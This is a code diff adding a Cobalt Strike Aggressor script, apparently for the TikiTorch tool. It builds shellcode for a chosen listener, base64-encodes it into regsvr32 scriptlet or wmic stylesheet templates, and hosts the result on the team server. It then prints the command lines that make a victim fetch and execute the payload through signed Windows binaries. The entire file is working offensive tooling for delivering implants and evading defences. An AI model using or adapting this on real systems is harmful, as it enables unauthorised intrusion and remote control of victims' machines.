@@ -1,0 +1,125 @@
+sub launch_tikitorch {
+	
+	local('%options $script $uri $payload');
+	%options = $3;
+
+	$uri = $3["uri"];
+	$host = $3["host"];
+	$port = $3["port"];
+	$listener = $3["listener"];
+	$arch = $3["arch"];
+	$stage = $3["stage"];
+	$process = $3["process"];
+	$format = $3["format"];
+
+	if ($arch eq "true") {
+		if ($stage eq "true") {
+			# 64bit stageless
+			artifact_stageless($listener, "raw", "x64", "", $this);
+			yield;
+			$payload = $1;
+		} else {
+			# 64bit staged
+			$payload = shellcode($listener, false, "x64");
+		}
+	} else {
+		if ($stage eq "true") {
+			# 32bit stageless
+			artifact_stageless($listener, "raw", "x86", "", $this);
+			yield;
+			$payload = $1;
+		} else {
+			# 32bit staged
+			$payload = shellcode($listener, false, "x86");
+		}
+	}
+
+	$encpayload = base64_encode($payload);
+
+	if ($format eq "Scriptlet") {
+
+		if ($arch eq "true") {
+			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x64.sct");
+		} else {
+			$template = getFileProper(script_resource("Templates\\regsvr32"), "TikiTorch_x64.sct");
+		}
+
+		if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[34]);
+		add(@data, "var tp = \" $+ $process $+ \"\;", 34);
+		remove(@data, @data[35]);
+		add(@data, "var sc = \" $+ $encpayload $+ \"\;", 35);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++){
+			$data = $data . @data[$i] . "\r\n";
+		}
+
+		$hosted = site_host($host, $port, $uri, $data, "plain/text", "TikiTorch Scriptlet Payload");
+		prompt_text("Command: ", "regsvr32 /s /n /u /i:\" $+ $hosted $+ \" scrobj.dll", {});
+
+		}
+
+	} else if ($format eq "Stylesheet") {
+		if ($arch eq "true") {
+			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x64.xsl");
+		} else {
+			$template = getFileProper(script_resource("Templates\\wmic"), "TikiTorch_x64.xsl");
+		}
+
+		if (-canread $template) {
+
+		$handle = openf($template);
+		@data = readAll($handle);
+		closef($handle);
+		remove(@data, @data[33]);
+		add(@data, "var tp = \" $+ $process $+ \"\;", 33);
+		remove(@data, @data[34]);
+		add(@data, "var sc = \" $+ $encpayload $+ \"\;", 34);
+
+		$data = "";
+
+		for ($i = 0; $i < size(@data); $i++){
+			$data = $data . @data[$i] . "\r\n";
+		}
+
+		$hosted = site_host($host, $port, $uri . ".xsl", $data, "plain/text", "TikiTorch Stylesheet Payload");
+		prompt_text("Command: ", "wmic os get /format:\" $+ $hosted $+ \"", {});
+
+		}
+	}
+}
+
+popup attacks {
+	
+	item "TikiTorch" {
+
+		local('$dialog %defaults');
+
+		%defaults["uri"] = "/TikiTorch";
+		%defaults["host"] = localip();
+		%defaults["port"] = 80;
+		%defaults["stage"] = "true";
+		%defaults["arch"] = "true";
+		%defaults["process"] = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe";
+
+		$dialog = dialog("TikiTorch", %defaults, &launch_tikitorch);
+		dialog_description($dialog, "Host a TikiTorch Payload on the CS Team Server.");
+		drow_text($dialog, "uri", "URI Path: ");
+		drow_text($dialog, "host", "Local Host: ");
+		drow_text($dialog, "port", "Local Port: ");
+		drow_listener_stage($dialog, "listener", "Listener: ")
+		drow_checkbox($dialog, "arch", "Architecture: ", "64-bit");
+		drow_checkbox($dialog, "stage", "Stage: ", "Stageless");
+		drow_text($dialog, "process", "Target Process Path: ");
+		drow_combobox($dialog, "format", "Format: ", @("Scriptlet", "Stylesheet"));
+		dbutton_action($dialog, "Go");
+		dialog_show($dialog);
+	}
+
+}
